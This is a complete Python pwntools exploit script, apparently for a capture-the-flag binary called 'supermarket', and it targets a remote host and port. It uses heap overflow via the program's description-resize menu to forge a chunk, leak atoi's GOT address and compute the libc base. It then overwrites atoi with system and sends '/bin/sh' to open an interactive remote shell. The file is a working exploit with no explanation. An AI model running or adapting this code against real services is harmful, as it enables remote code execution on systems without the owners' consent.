from pwn import *
# p=process("./supermarket")
# libc=ELF("/libc32.so")
p=remote("111.198.29.45","51575")
libc=ELF("./libc.so.6")

e=ELF("./supermarket")
context.log_level='debug'
def add(name,price,desc_size,desc='1\n'):
    p.recvuntil(">")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(name))
    p.recvuntil(":")
    p.sendline(str(price))
    p.recvuntil(":")
    p.sendline(str(desc_size))
    p.recvuntil(":")
    p.send(str(desc))


def dele(name):
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(name))

def show():
    p.recvuntil(">")
    p.sendline("3")

def change(name,desc_size,desc='1\n'):
    p.recvuntil(">")
    p.sendline("5")
    p.recvuntil(":")
    p.sendline(str(name))
    p.recvuntil(":")
    p.sendline(str(desc_size))
    p.recvuntil(":")
    p.send(str(desc))



add(1,123,0x100)
add(2,123,0x1c)
change(1,0x1c)
add(3,123,0x3c)
fake=p32(0)*7+p32(0x21)+'here'+p32(0)*3+p32(0x7b)+p32(0x3c)+p32(e.got['atoi'])+p32(0x21)+'\n'
change(1,0x100,fake)
# gdb.attach(p,"b*0x08048B7A")
show()
p.recvuntil('here',drop=True)
p.recvuntil("des.")
# print hexdump(p.recv())
# print hex(u32(p.recv(4))-libc.symbols['atoi'])
libc.address=u32(p.recv(4))-libc.symbols['atoi']
change('here',0x3c,p32(libc.symbols['system'])+'1\n')
p.recvuntil(">")
p.sendline("/bin/sh")
p.interactive()
